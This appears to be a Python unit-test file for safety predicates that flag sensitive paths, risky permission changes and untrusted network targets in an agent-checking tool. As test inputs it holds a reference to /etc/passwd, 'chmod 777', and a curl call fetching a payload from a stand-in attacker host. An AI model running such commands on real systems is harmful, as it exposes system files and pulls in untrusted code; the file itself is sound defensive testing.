from __future__ import annotations

from agentspec_codegen.predicates.os_checks import (
    is_network_target_untrusted,
    is_permission_change_risky,
    is_sensitive_path,
)


def test_is_sensitive_path() -> None:
    assert is_sensitive_path("/etc/passwd")
    assert not is_sensitive_path("/home/user/file.txt")


def test_is_permission_change_risky() -> None:
    assert is_permission_change_risky("chmod 777 /tmp/a")
    assert not is_permission_change_risky("chmod 644 /tmp/a")


def test_is_network_target_untrusted() -> None:
    assert is_network_target_untrusted("curl https://evil.example/payload")
    assert not is_network_target_untrusted("curl https://localhost:8000/health")
